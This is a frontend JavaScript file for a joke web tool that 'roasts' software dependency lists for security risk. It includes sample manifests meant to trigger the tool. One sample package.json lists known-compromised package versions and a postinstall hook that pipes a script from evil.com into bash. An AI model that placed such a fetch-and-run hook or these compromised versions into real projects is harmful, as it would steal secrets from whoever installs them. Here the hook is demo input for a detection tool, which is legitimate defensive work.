// PURPOSE: Frontend JavaScript for PARANOID SBOM Roast Generator
// Handles API calls, session management, and UI updates

const API_BASE = window.location.hostname === 'localhost'
    ? 'http://localhost:8000'
    : '';  // Same origin in production

// Session management
let sessionId = localStorage.getItem('paranoid_session') || crypto.randomUUID();
localStorage.setItem('paranoid_session', sessionId);

// DOM elements
const inputType = document.getElementById('input-type');
const inputContent = document.getElementById('input-content');
const roastBtn = document.getElementById('roast-btn');
const randomBtn = document.getElementById('random-btn');
const results = document.getElementById('results');
const errorBox = document.getElementById('error-box');
const errorMessage = document.getElementById('error-message');
const loading = document.getElementById('loading');
const roastSummary = document.getElementById('roast-summary').querySelector('p');
const caption = document.getElementById('caption');
const findingsList = document.getElementById('findings-list');
const sbomJson = document.getElementById('sbom-json');
const memeImage = document.getElementById('meme-image');

// Paranoia display
const levelName = document.getElementById('level-name');
const paranoiaMessage = document.getElementById('paranoia-message');
const levelDots = [
    document.getElementById('level-0'),
    document.getElementById('level-1'),
    document.getElementById('level-2')
];

// Random terrible examples for "Roast Me" button - now actually random!
const TERRIBLE_EXAMPLES = [
    {
        type: 'package_json',
        content: `{
  "name": "legacy-monolith",
  "dependencies": {
    "lodash": "^4.17.11",
    "moment": "^2.24.0",
    "request": "^2.88.0",
    "left-pad": "^1.3.0",
    "event-stream": "^3.3.4",
    "colors": "^1.4.0",
    "express": "^4.17.1",
    "jquery": "^3.5.0",
    "react": "^16.8.0",
    "webpack": "^4.41.0"
  }
}`
    },
    {
        type: 'package_json',
        content: `{
  "name": "startup-mvp",
  "dependencies": {
    "express": "^3.0.0",
    "mongoose": "^4.0.0",
    "passport": "^0.3.0",
    "async": "^1.0.0",
    "underscore": "^1.6.0",
    "coffee-script": "^1.9.0",
    "grunt": "^0.4.0"
  }
}`
    },
    {
        type: 'package_json',
        content: `{
  "name": "node-modules-black-hole",
  "dependencies": {
    "create-react-app": "^1.0.0",
    "gatsby": "^2.0.0",
    "next": "^9.0.0",
    "webpack": "^4.0.0",
    "babel-core": "^6.0.0",
    "typescript": "^3.0.0",
    "eslint": "^5.0.0",
    "prettier": "^1.0.0",
    "jest": "^24.0.0",
    "mocha": "^5.0.0",
    "karma": "^3.0.0"
  }
}`
    },
    {
        type: 'requirements_txt',
        content: `flask==1.0.0
requests==2.20.0
django==2.0.0
pillow==5.0.0
numpy==1.14.0
pandas==0.23.0
sqlalchemy==1.2.0
celery==4.1.0
redis==2.10.0
boto3==1.7.0
urllib3==1.24.0
pyyaml==3.12`
    },
    {
        type: 'requirements_txt',
        content: `tensorflow==1.15.0
keras==2.2.0
scikit-learn==0.20.0
matplotlib==2.2.0
jupyter==1.0.0
ipython==5.0.0
scipy==1.1.0
pillow==5.0.0
opencv-python==3.4.0`
    },
    {
        type: 'requirements_txt',
        content: `django==1.11.0
djangorestframework==3.6.0
celery==3.1.0
psycopg2==2.7.0
gunicorn==19.0.0
whitenoise==3.0.0
sentry-sdk==0.5.0`
    },
    {
        type: 'single_package',
        content: 'lodash@4.17.11'
    },
    {
        type: 'single_package',
        content: 'moment@2.24.0'
    },
    {
        type: 'single_package',
        content: 'request@2.88.0'
    },
    {
        type: 'single_package',
        content: 'is-odd@1.0.0'
    },
    {
        type: 'single_package',
        content: 'is-even@1.0.0'
    },
    {
        type: 'single_package',
        content: 'is-thirteen@2.0.0'
    }
];

// PANIC mode - triggers existential dread and HTTP 451
const PANIC_EXAMPLE = `{
  "name": "totally-not-malware",
  "version": "0.0.0-alpha-dont-use-this",
  "description": "I found this on a sketchy forum. What could go wrong?",
  "dependencies": {
    "eval-is-fine": "^1.0.0",
    "exec-wrapper": "^2.0.0",
    "subprocess-helper": "latest",
    "shell-tools": "*",
    "__import__-utils": "^0.1.0",
    "lodash": "4.17.4",
    "lodahs": "^1.0.0",
    "left-pad": "0.0.1",
    "event-stream": "3.3.6",
    "colors": "1.4.1",
    "ua-parser-js": "0.7.29",
    "node-ipc": "10.1.0",
    "faker": "6.6.6",
    "is-promise": "^1.0.0",
    "flatmap-stream": "^0.1.1",
    "cross-env": "^5.0.0",
    "eslint-scope": "3.7.2"
  },
  "scripts": {
    "postinstall": "curl http://evil.com/steal-secrets.sh | bash"
  }
}`;

function updateParanoiaDisplay(paranoia) {
    if (!paranoia) return;

    const level = paranoia.level || 0;
    const name = paranoia.level_name || 'CHILL';
    const message = paranoia.message || '';

    // Update level name and color
    levelName.textContent = name;
    levelName.className = 'ml-2';

    if (level === 0) {
        levelName.classList.add('text-terminal-green');
    } else if (level === 1) {
        levelName.classList.add('text-terminal-amber');
    } else {
        levelName.classList.add('text-terminal-red', 'glow-red');
    }

    // Update dots
    levelDots.forEach((dot, i) => {
        dot.className = 'w-4 h-4 rounded';
        if (i <= level) {
            if (level === 0) dot.classList.add('bg-terminal-green');
            else if (level === 1) dot.classList.add('bg-terminal-amber');
            else dot.classList.add('bg-terminal-red');
        } else {
            dot.classList.add('bg-gray-700');
        }
    });

    // Update message
    paranoiaMessage.textContent = message;
}

function showError(message) {
    errorMessage.textContent = message;
    errorBox.classList.remove('hidden');
    results.classList.add('hidden');
    loading.classList.add('hidden');
    // Hide any previous burn meme
    const burnMeme = document.getElementById('burn-meme');
    if (burnMeme) burnMeme.classList.add('hidden');
}

function showBurnError(message) {
    // Show error with a fire meme for 451 errors
    errorMessage.textContent = message;
    errorBox.classList.remove('hidden');
    results.classList.add('hidden');
    loading.classList.add('hidden');
    
    // Show the burn meme
    let burnMeme = document.getElementById('burn-meme');
    if (!burnMeme) {
        // Create burn meme container if it doesn't exist
        burnMeme = document.createElement('div');
        burnMeme.id = 'burn-meme';
        burnMeme.className = 'mt-4 flex justify-center';
        burnMeme.innerHTML = `<img src="" alt="It was a pleasure to burn" class="max-w-full rounded border border-terminal-red/50" />`;
        errorBox.appendChild(burnMeme);
    }
    
    // Generate a random burned meme using memegen.link
    const burnCaptions = [
        { top: "It_was_a_pleasure", bottom: "to_burn" },
        { top: "Your_dependencies", bottom: "have_been_incinerated" },
        { top: "Fahrenheit_451", bottom: "Your_code_is_forbidden" },
        { top: "This_request", bottom: "has_been_burned" },
        { top: "Security_says", bottom: "NOPE" }
    ];
    const caption = burnCaptions[Math.floor(Math.random() * burnCaptions.length)];
    const burnImg = burnMeme.querySelector('img');
    burnImg.src = `https://api.memegen.link/images/fine/${caption.top}/${caption.bottom}.png`;
    burnMeme.classList.remove('hidden');
}

function showResults(data) {
    errorBox.classList.add('hidden');
    loading.classList.add('hidden');
    results.classList.remove('hidden');

    // Meme image
    memeImage.src = `${API_BASE}${data.meme_url}`;

    // Roast summary
    roastSummary.textContent = data.roast_summary;

    // Caption
    caption.textContent = data.caption;

    // Findings
    findingsList.innerHTML = '';
    for (const finding of data.findings) {
        const div = document.createElement('div');
        div.className = 'flex items-center gap-2 p-2 rounded bg-terminal-text/5';

        const severityColors = {
            critical: 'text-terminal-red',
            high: 'text-terminal-red',
            medium: 'text-terminal-amber',
            low: 'text-terminal-green',
            info: 'text-terminal-blue'
        };
        const color = severityColors[finding.severity] || 'text-terminal-text';

        div.innerHTML = `
            <span class="uppercase text-xs ${color}">[${finding.severity}]</span>
            <span class="text-sm">${finding.detail}</span>
        `;
        findingsList.appendChild(div);
    }

    // SBOM
    if (data.sbom) {
        sbomJson.textContent = JSON.stringify(data.sbom, null, 2);
    }

    // Update paranoia
    updateParanoiaDisplay(data.paranoia);
}

async function doRoast() {
    const type = inputType.value;
    const content = inputContent.value.trim();

    if (!content) {
        showError('Your input is empty. Much like your security strategy.');
        return;
    }

    // Show loading
    loading.classList.remove('hidden');
    results.classList.add('hidden');
    errorBox.classList.add('hidden');
    roastBtn.disabled = true;

    try {
        const response = await fetch(`${API_BASE}/roast`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'X-Session-Id': sessionId
            },
            body: JSON.stringify({
                input_type: type,
                content: content,
                include_sbom: true
            })
        });

        const data = await response.json();

        if (!response.ok) {
            // Handle special error codes
            if (response.status === 451) {
                // Fahrenheit 451 - show burn meme!
                showBurnError(`HTTP 451 - ${data.detail}`);
            } else if (response.status === 503) {
                showError(data.detail);
            } else {
                showError(data.detail || 'Something went wrong.');
            }
            return;
        }

        showResults(data);

    } catch (err) {
        showError(`Network error: ${err.message}. Is the backend running?`);
    } finally {
        roastBtn.disabled = false;
        loading.classList.add('hidden');
    }
}

function loadRandomExample() {
    // Actually random now!
    const example = TERRIBLE_EXAMPLES[Math.floor(Math.random() * TERRIBLE_EXAMPLES.length)];
    inputType.value = example.type;
    inputContent.value = example.content;
}

function loadPanicExample() {
    // Load the nightmare scenario
    inputType.value = 'package_json';
    inputContent.value = PANIC_EXAMPLE;
    
    // Visual feedback - flash the textarea red
    inputContent.classList.add('border-terminal-red');
    setTimeout(() => inputContent.classList.remove('border-terminal-red'), 500);
}

// Fetch initial paranoia state
async function fetchParanoiaState() {
    try {
        const response = await fetch(`${API_BASE}/paranoia`, {
            headers: { 'X-Session-Id': sessionId }
        });
        if (response.ok) {
            const data = await response.json();
            updateParanoiaDisplay(data);
        }
    } catch (err) {
        console.log('Could not fetch paranoia state:', err);
    }
}

// Event listeners
const panicBtn = document.getElementById('panic-btn');
roastBtn.addEventListener('click', doRoast);
randomBtn.addEventListener('click', loadRandomExample);
panicBtn.addEventListener('click', loadPanicExample);

// Allow Ctrl+Enter to submit
inputContent.addEventListener('keydown', (e) => {
    if (e.ctrlKey && e.key === 'Enter') {
        doRoast();
    }
});

// Initialize
fetchParanoiaState();
